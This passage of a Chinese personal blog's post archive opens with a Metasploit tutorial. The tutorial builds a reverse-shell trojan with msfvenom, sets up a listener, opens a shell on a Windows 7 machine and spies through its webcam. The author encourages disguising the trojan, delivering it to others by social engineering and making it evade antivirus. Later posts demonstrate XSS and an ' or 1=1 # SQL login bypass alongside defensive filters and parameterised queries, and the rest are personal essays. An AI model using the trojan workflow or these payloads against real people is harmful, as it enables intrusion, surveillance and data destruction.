-f exe -o hello.exe 输入ls命令列出当前目录下的文件，可以看到我们刚刚生成好的 hello.exe 3.进入msfconsole设置本机监听的地址和端口依次输入下列命令1234msfconsoleuse exploit/multi/handlerset lhost 192.168.1.74set lport 6666 4.执行渗透监听，等待被攻击主机上线1exploit -z -j 5.接下来是运用社会工程学，将渗透程序hello.exe发送给别人即可（需要自己加壳，并且做免杀，做各种伪装）。我们可以把hello.exe伪装成其他文件让被攻击者触发即可。为了演示方便，我把hello.exe复制到Windows7系统，并且直接双击。 6.回到我们的Kali Linux系统，可以看到已经有一台计算机通过渗透程序向我们发送了数据包。这时候我们可以开始选择入侵设备了。输入sessions，查看当前在线的肉鸡输入sessions -i 1 -i后面跟的是当前在线主机的session id号 7.使用shell命令，进入目标主机的终端命令行，执行文件的新增，删除等操作输入shell命令后就可以看到Windows上熟悉的cmd命令行终端字符了，进入后我们就可以执行任意的操作了，使用dir查看文件，md创建文件，rd删除文件，其他各种命令不再列出，可见身为一个合格的黑客，不仅仅要只会Linux，还需要会Windows的各种操作，比如cmd命令和注册表等，否则入侵之后不知道要做什么就懵逼了，我对Windows的这些操作仅限于基本操作。以后还要慢慢提高。使用exit 退出shell命令行ps 查看进程sysinfo 查看系统架构和信息 8.打开摄像头进行录像拍照1run webcam -p /var/www #在/var/www目录监控目标主机的摄像头 执行run webcam命令后，渗透程序会打开目标主机上的摄像机并且将图片逐帧传回到Kali Linux上。Kalinux会自动打开run命令所在的 /var/www下的临时网络服务，用网页的方式查看被攻击者现场摄像机。 我们已经成功的渗透了Windows7，并进行了各种操作和打开摄像机拍照。那么这样就结束了吗？其实这才是刚刚开始，我们还没有对渗透程序进行免杀处理，简单的远程控制软件大部分普通的程序猿都可以做到，做到免杀才是关键！绕过杀毒软件才是核心技术。杀毒软件通过特征码的匹配可以很快的识别出这是一个木马程序，我们要做的就是和杀毒软件对抗，必要时需要自己用汇编修改文件特征码。比较厉害的杀软会在程序运行期间对内存特征码进行扫描，直接用c或者编译型的程序直接操作目标主机文件也会被发现，这种情况下我们需要用动态脚本语言，比如python来写木马，然后包上python解释器编译成exe，做到免杀。 这篇文章仅仅是使用msfvenom生成，我后续会学习汇编的相关知识，自己做个免杀的木马。剩下的部分，就靠社会工程学吧！]]></content>
      <categories>
        <category>杂谈</category>
      </categories>
      <tags>
        <tag>杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS攻击]]></title>
    <url>%2F4fa736d8%2F</url>
    <content type="text"><![CDATA[XSS攻击全称为跨站脚本攻击。XSS是一种在web应用中的计算机安全漏洞，允许攻击者将恶意代码植入到网页中，导致其他正常用户访问该网页时被攻击。XSS最常见的做法就是在提交表单中插入html或者js脚本来达到攻击目的。这种攻击在互联网发展初期是很常见的，百度贴吧和新浪微博曾经都有被XSS攻击过。引起XSS攻击的关键原因还是在于开发时编写的程序不够严谨，没有对xss进行过滤。 虽然XSS攻击从出现到现在已经年代久远，但是他所产生的危害不容小视。当前主流的框架已经为我们提供好并且封装了各种功能，对XSS攻击也可以用简单的配置来过滤掉。不过还是那句话，框架只是工具，关键在于使用工具的人。如果遇到比较坑的开发人员，就算使用这些做了安全过滤的框架 任然可能因为使用不当造成被攻击的可能。 之前遇到的一家第三方软件公司，他们非常抵触用框架来开发，全部用jsp来写web程序，就和大学课堂上教的编程基础课一样，没有考虑到安全问题，自然有各种漏洞，没有写过滤器对XSS进行过滤，可以很轻易的就被攻击。 下面是简单的XSS攻击实例，使用jsp来搭建一个简单的网站，没有对xss进行过滤，主要就两个页面1.查看信息列表页面2.添加文章信息页面 正常的用户输入文字内容，点击保存跳转回信息列表页面，即可在信息列表页面查看到刚刚输入的文章内容。如果是别有用心的攻击者，只需要输入html或者js即可完成注入。这里我们输入一个js脚本用来弹出对话框，并插入一个 a标签注入url链接。 点击保存后跳转到信息列表页面时，我们可以看到原本正常的页面变得不正常了，浏览器跳出了对话框，对话框内容就是我们刚刚输入的js弹出内容，并且可以看到新增记录的文章内容变成了一个可以点击跳转的链接，如果攻击者输入了一个带有钓鱼网站的链接，那么其他用户在访问这个网页的时候就会看到和现在页面一样的情况，如果点击了链接就有可能中招。 试着添加一条文章，内容里面写html标签，看看能否用iframe来插入一个网页点击保存，回到信息列表页面，发现文章内容被插入了一个网页 打开数据库，发现我们数据库直接存了用户提交的内容，没有进行任何转义处理。其他用户在查看信息列表页面时将查询出数据库的数据直接传给浏览器，浏览器会直接解释执行这些标签，给访问的用户造成危害。 我们应该添加一个Filter对用户输入的数据进行过滤新建一个SecurityFilter类继承自Filter类1234567891011121314151617181920212223242526272829303132333435363738394041package com.lanshiqin.student.filter;import javax.servlet.*;import javax.servlet.http.HttpServletRequest;import java.io.IOException;/** * 安全过滤器 * 可以在doFilter中添加多个过滤规则 */public class SecurityFilter implements Filter &#123; @Override public void init(FilterConfig filterConfig) throws ServletException &#123; &#125; /** * 过滤函数,可以添加多个规则 * * @param servletRequest 请求对象 * @param servletResponse 响应对象 * @param filterChain 过滤器链 * @throws IOException 异常信息 * @throws ServletException servlet异常信息 */ @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123; // 过滤请求中的xss攻击 filterChain.doFilter(new XSSRequestWrapper((HttpServletRequest) servletRequest), servletResponse); // 过滤或拦截其他攻击 // ... &#125; @Override public void destroy() &#123; &#125;&#125; 新建一个XSSRequestWrapper类继承自HttpServletRequestWrapper类123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150package com.lanshiqin.student.filter;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletRequestWrapper;import java.util.regex.Pattern;/** * xss过滤规则包装类 */public class XSSRequestWrapper extends HttpServletRequestWrapper &#123; private HttpServletRequest orgRequest; // httpServlet请求对象 public XSSRequestWrapper(HttpServletRequest request) &#123; super(request); orgRequest = request; &#125; /** * 覆盖getParameter方法，将参数名和参数值都做xss &amp; sql过滤。 * 如果需要获得原始的值，则通过super.getParameterValues(name)来获取 * getParameterNames,getParameterValues和getParameterMap也可能需要覆盖 */ @Override public String getParameter(String name) &#123; String value = super.getParameter(xssEncode(name)); if (value != null) &#123; value = xssEncode(value); &#125; return value; &#125; /** * 覆盖getHeader方法，将参数名和参数值都做xss &amp; sql过滤。 * 如果需要获得原始的值，则通过super.getHeaders(name)来获取 * getHeaderNames 也可能需要覆盖 */ @Override public String getHeader(String name) &#123; String value = super.getHeader(xssEncode(name)); if (value != null) &#123; value = xssEncode(value); &#125; return value; &#125; /** * 将容易引起xss &amp; sql漏洞的半角字符直接替换成全角字符 * * @param s 请求数据 * @return 编码后的请求数据 */ private static String xssEncode(String s) &#123; if (s == null || s.isEmpty()) &#123; return s; &#125; else &#123; s = stripXSSAndSql(s); &#125; StringBuilder sb = new StringBuilder(s.length() + 16); for (int i = 0; i &lt; s.length(); i++) &#123; char c = s.charAt(i); switch (c) &#123; case '&gt;': sb.append("＞");// 转义大于号 break; case '&lt;': sb.append("＜");// 转义小于号 break; case '\'': sb.append("＇");// 转义单引号 break; case '\"': sb.append("＂");// 转义双引号 break; case '&amp;': sb.append("＆");// 转义&amp; break; case '#': sb.append("＃");// 转义# break; default: sb.append(c); break; &#125; &#125; return sb.toString(); &#125; /** * 获取最原始的request * * @return request */ public HttpServletRequest getOrgRequest() &#123; return orgRequest; &#125; /** * 获取最原始的request的静态方法 * 在装饰者设计模式下，除了过滤xss，可能还有多个过滤器包装类 * 提供静态方法方便继承该类的装饰者包装新的安全规则 * * @return request请求对象 */ public static HttpServletRequest getOrgRequest(HttpServletRequest req) &#123; if (req instanceof XSSRequestWrapper) &#123; return ((XSSRequestWrapper) req).getOrgRequest(); &#125; return req; &#125; /** * 防止xss跨脚本攻击（替换，根据实际情况调整） * 通过正则匹配敏感字符 */ public static String stripXSSAndSql(String value) &#123; if (value != null) &#123; // Avoid anything between script tags Pattern scriptPattern = Pattern.compile("&lt;[\r\n| | ]*script[\r\n| | ]*&gt;(.*?)&lt;/[\r\n| | ]*script[\r\n| | ]*&gt;", Pattern.CASE_INSENSITIVE); value = scriptPattern.matcher(value).replaceAll(""); // Avoid anything in a src="http://www.yihaomen.com/article/java/..." type of e-xpression scriptPattern = Pattern.compile("src[\r\n| | ]*=[\r\n| | ]*[\\\"|\\\'](.*?)[\\\"|\\\']", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL); value = scriptPattern.matcher(value).replaceAll(""); // Remove any lonesome &lt;/script&gt; tag scriptPattern = Pattern.compile("&lt;/[\r\n| | ]*script[\r\n| | ]*&gt;", Pattern.CASE_INSENSITIVE); value = scriptPattern.matcher(value).replaceAll(""); // Remove any lonesome &lt;script ...&gt; tag scriptPattern = Pattern.compile("&lt;[\r\n| | ]*script(.*?)&gt;", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL); value = scriptPattern.matcher(value).replaceAll(""); // Avoid eval(...) expressions scriptPattern = Pattern.compile("eval\\((.*?)\\)", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL); value = scriptPattern.matcher(value).replaceAll(""); // Avoid e-xpression(...) expressions scriptPattern = Pattern.compile("e-xpression\\((.*?)\\)", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL); value = scriptPattern.matcher(value).replaceAll(""); // Avoid javascript:... expressions scriptPattern = Pattern.compile("javascript[\r\n| | ]*:[\r\n| | ]*", Pattern.CASE_INSENSITIVE); value = scriptPattern.matcher(value).replaceAll(""); // Avoid vbscript:... expressions scriptPattern = Pattern.compile("vbscript[\r\n| | ]*:[\r\n| | ]*", Pattern.CASE_INSENSITIVE); value = scriptPattern.matcher(value).replaceAll(""); // Avoid onload= expressions scriptPattern = Pattern.compile("onload(.*?)=", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL); value = scriptPattern.matcher(value).replaceAll(""); &#125; return value; &#125;&#125; 在项目的web.xml中添加安全过滤器配置123456789101112131415161718&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd" version="3.1"&gt; &lt;!--安全过滤器配置--&gt; &lt;filter&gt; &lt;filter-name&gt;securityFilter&lt;/filter-name&gt; &lt;filter-class&gt;com.lanshiqin.student.filter.SecurityFilter&lt;/filter-class&gt; &lt;/filter&gt; &lt;filter-mapping&gt; &lt;filter-name&gt;securityFilter&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt; &lt;dispatcher&gt;REQUEST&lt;/dispatcher&gt; &lt;/filter-mapping&gt;&lt;/web-app&gt; 可以看到我们的过滤器作用域为REQUES，匹配路径我们配置成/*，这样访问该网站的所有路径的请求都会走到我们的过滤器进行过滤。我们过滤器主要是做了字符匹配替换的操作。把XSS的半角字符替换成全角字符，主要其实过滤掉尖括号标签，让非法用户注入的html标签和js被破坏，页面提交重放后无法正常执行注入的html和js。 加上过滤器后我们重新运行网站，再次进行XSS注入测试。提交保存后，回到信息列表页面，底下两条是我们刚刚最新添加的文章，输入内容直接被显示出来了，url连接也无法注入了。原本的半角字符被替换成全角，所以xss被破坏就无法被执行了。上面的转换规则可以过滤掉一些简单的XSS注入，如果你的网站后台需要接受一个json格式的数据，提交的json数据里半角双引号会被转换成全角双引号，这时候就需要更加业务需求修改规则，比如对符号进行转义，而不是替换成全角。我们主要过滤的其实是尖括号标签，去掉头尾，一般的xss就会被破坏。 很多论坛网站的文章内容输入表单，一般都是用类似于UEditer的富文本框来接收用户的输入，会把用户输入的内容转义成html标签转义字符给后台，后台在存储到数据库中，由于数据库存放的已经是转义后的标签，这样就不用担心用户输入了html或者js等内容。保存的文章被查询出来时是被转义的字符，浏览器无法执行这个被转义的标签，而是当做字符串被转义成内容显示在网页上。这样就过滤了XSS攻击]]></content>
      <categories>
        <category>杂谈</category>
      </categories>
      <tags>
        <tag>杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入攻击]]></title>
    <url>%2Fd9130e7c%2F</url>
    <content type="text"><![CDATA[sql注入在互联网应用早期很常见，大多数是因为程序员没有考虑到sql注入的问题对sql语句进行过滤，直接使用字符串拼接的方式来传值着就给sql注入造成了可能。 不能公开做违法乱纪的事，所以我自己写了个示例程序，来重现一下当时遇到的安全问题。首先是sql注入 简单的登录表单页面 执行登录验证操作的程序 数据库 启动Tomcat服务器，访问项目 输入用户名和密码，假设我们不知道密码，这里故意输错密码，随便输入一个错误的密码，点击登录 我们回到登录页面，测试一下sql注入 点击登录，发现登录成功！ 我们在不知道用户名和密码的情况下成功的登录到了登录成功后的页面，实现了sql注入。问题主要出在执行登录程序的数据库查询的sql语句1SELECT * FROM user WHERE username='"+userName+"' AND password='"+passWord+"'" 使用这种拼接的方式容易给攻击者注入的机会，这里拼接上我们传进来的用户名和密码，我在登录表单那里输入的数据拼接进来后变成这样1SELECT * FROM user WHERE username='' or 1=1 #' AND password='1234567890' 可以看到前面的符号 ‘ 把我们把用户名值切断掉，让数据库查询条件变成查询用户名为空字符串的，此时数据库虽然没有匹配的记录，但是我们在后面再拼接上 or 1=1 这样就可以把数据库中user表的所有记录都查询出来，然后输入#号会把后面的sql语句都注释掉不执行最终执行的sql语句变成这样：1SELECT * FROM user WHERE username='' or 1=1 我们成功注入 or 1=1 并且跳转到登录成功后的页面，这种注入还可以让我们执行任意sql语句，比如执行删除语句把整个数据库数据都删除！ 如果程序中的sql拼接改成这样1SELECT * FROM user WHERE username="+userName+" AND password="+passWord 那我们的sql注入就需要多加个’号1'' or 1=1 # 对应mysql数据库，注释符是用#号，如果是其他数据库，比如SQL Server数据库，我们要使用两个 - 符号即可注释掉后面的sql语句。sql拼接的这种语句很容易让攻击者注入，只需要多试几次就可以实现注入。 为了防止这种常见的低级注入，我们不要使用拼接sql的方式来查询数据库。我发现目前的教科书和学校教的web编程课程中都没有提到类似的安全性问题，为了便于学生理解，很多都是使用sql拼接，我觉得关于web安全这点在学习过程中一定要时刻注意，防止犯一些低级错误。要始终牢记，用户的输入永远都是不可信的，一定要做校验和转换。像hibernate这类ORM框架已经替我们实现好了这一点，如果要自己用jdbc写的话，建议使用PreparedStatement进行传参数的方式防止sql注入。从网络安全的角度去思考问题，有助于开发出比较健壮相对比较安全的网站。对提高自身编程水平也是有帮助的。如果从事web开发，这种安全问题其实也是必须要指定并且尽量去避免的。框架虽然帮我们实现了这些功能但是我们还是要去学习他，我们可以学习框架的设计思想，达到提高自己的目的。比较常见的web攻击除了sql注入，还有xss等。我在后续的文章中会讲到。]]></content>
      <categories>
        <category>杂谈</category>
      </categories>
      <tags>
        <tag>杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[编程是一种信仰]]></title>
    <url>%2Fe8cdb82b%2F</url>
    <content type="text"><![CDATA[今天是2017年12月1日，是一个月新的开始。同时，今天也是星期五，一周的结束。距离2018年仅有1个月的时间，回望一下即将过去的2017年，这里做一下总结。大学主攻Java，搞了3年的Android应用开发。从Android 2.3一直到Android7.0版本，Android开发工具也从Eclipse转移到了AndroidStudio，用AndroidStudio开发过项目的人都知道，这是Google官方推荐的专业Android开发工具，他基于IntelliJ IDEA开发，并且使用Gradle来构建项目，需要的第三方库只需要加入依赖即可，毋庸置疑这是一款非常专业的开发工具，直到2017年1月份我仍然在使用AndroidStudio来开发学习最新的Android7.0新特性。大学期间除了主攻的Java外，学校还上了很多课程，比如c、c#、ASP.NET、SQL Server等，另外自己还买来Python的书，还有树莓派、Arduino等，中间还折腾过Unity3，AR增强现实，遥控小车等……大学基本在学校的工作室度过的,所以有大把的时间进行折腾，可以说我的大学生活过的很充实。随着应用市场的饱和，基本已经不缺日常的App应用了，除了可以自己开发日常使用的工具类App，剩下的android开发需求基本都在外包和产品上了。Java的主要市场地位其实是在Web应用开发领域，之前我一直想从事Java Web开发却一直没有机会，写了多年的移动端，每次和后台对接口，解析别人定义好的数据格式，我是满满的羡慕，业务的核心基本都是在后端，希望自己能写服务端，能够成为定制规则的人。一次机缘巧合的机会，我们工作室刚好缺少Java Web开发的人员，Android开发的人倒是一大堆。所以我就跟我们工作室老师说我想从事Java Web开发。从第一个园区项目开始到现在为止，我已经参与做了几个Web项目了，其中走过了不少坑，也学习到了很多。开发基本都是靠自学，毋庸置疑 编程的知识需要靠自己去学，如果要学好它要自己去专研，通过看教学视频可以短期内提高认知水平，但还是远远不够的，需要多写多练习，学习别人的编程思想。Java web开发刚开始时，我和传统的学法一样，不管技术过不过时，之前有没有学过，全部重新先过一遍，从最基础的 html、css、js、jQuery、jsp、servlet、jdbc到框架Spring、Spring MVC、Hibernate都过了一遍，不敢说全部掌握，但是开发项目已经不成问题。搞开发仅仅会编程还是不够的，还要掌握各种工具和方法，比如Maven和Gradle构建，svn和git版本控制等，尤其是web开发，最好要有扎实的数据库功底，对解决各种优化查询 并非查询的问题 真的很有用。我很欣慰之前有扎实的Java功底，这些对我来说只是知识储备量的问题，但Java Web要学的还有很多，这时候千万不能停止学习的脚步。最近我在学习当前比较主流的技术 Vue、SpringBoot、Mybatis、Srping Cloud 分布式等。我的毕设决定做一个分布式API网关，从原先的Java Web入门小白到能够自己去发现知识运用知识，我用了将近快一年，虽然还不是很优秀，但是我感到很欣慰。编程就像是我的信仰一样，驱使着我不断前行。]]></content>
      <categories>
        <category>杂谈</category>
      </categories>
      <tags>
        <tag>杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[魔方的艺术]]></title>
    <url>%2Ffa5a2a73%2F</url>
    <content type="text"><![CDATA[最近喜欢上了玩魔方，因为魔方还原的步骤就像编程，魔方SDK的魅力促使我特意买了2到5阶的魔方，准备训练一下自己的逻辑思维能力。玩魔方和学编程一样，快速的入门方法就是看操作手册，目标导向有助于一个好的开始，通过研究别人的魔方还原步骤，我成功的还原了整个3阶魔方。魔方，英文名为Bubik’s Cube,魔方是在1974年匈牙利布达佩斯建筑学院厄尔诺·鲁比克教授发明的，所以又叫做鲁比克方块。魔方的发明最初是为了帮助学生认知空间立方体的组成结构，锻炼学生的记忆能力和空间思维能力。现如今已经发展成为一种手部极限运动，魔方是一项智力运动。 魔方背后的数学是群论，魔方被打乱的变化总数为 4.3X10^19 ，目前人类还原三阶魔方的世界纪录是4.59秒，而专门的魔方机器人则可以1秒还原，理论上可以更快。很多魔方高手都有自己还原魔方的一些算法，但是最快的算法是21步以内还原。通过计算机计算得到的魔方还原步骤可知，被打乱的任何三阶魔方理论上都可以通过21步以内还原。 为了学习魔方，我特意买了2345阶的魔方。 把三阶魔方打乱，还原前。 还原后 还原魔方可以练小脑，可以用不同的解法多加训练，提高自己的空间思维能力和记忆力。在还原魔方的过程中，在我看来就像是在做软件工程。首先分析需求，我们要做的就是还原魔方的6个面。套用别人的步骤公式来还原魔方，就像是编程中看别人的api文档来开发一样。目标为导向就是为了解决问题得到预期目标结果，在每次还原魔方的工程中我们用了一些不理解的步骤，可以先不用理会他，照做就是。最后我们成功的还原了魔方，达到最终目标。当然，练习小脑不仅仅是套用公式来达到肌肉记忆，我们还应该去专研还原步骤的逻辑原理，提高我们的认知和记忆能力，在掌握某个编程语言的api后，我们应该深入底层，掌握核心原理。毫无疑问，魔方SDK可以提高我们的思维能力，是人脑理解编程的一种方式。魔方是一种艺术！]]></content>
      <categories>
        <category>杂谈</category>
      </categories>
      <tags>
        <tag>杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[年轻的战场]]></title>
    <url>%2Fb1d4025b%2F</url>
    <content type="text"><![CDATA[你好，世界！我是蓝士钦。这是一篇简单的开始，我会好好努力，书写精彩的自己。站在这年轻的战场，我怀揣一个坚定的信仰，未来的远方在召唤，前行的路还很漫长，请多多指教。]]></content>
      <categories>
        <category>杂谈</category>
      </categories>
      <tags>
        <tag>杂谈</tag>
      </tags>
  </entry>
</search>
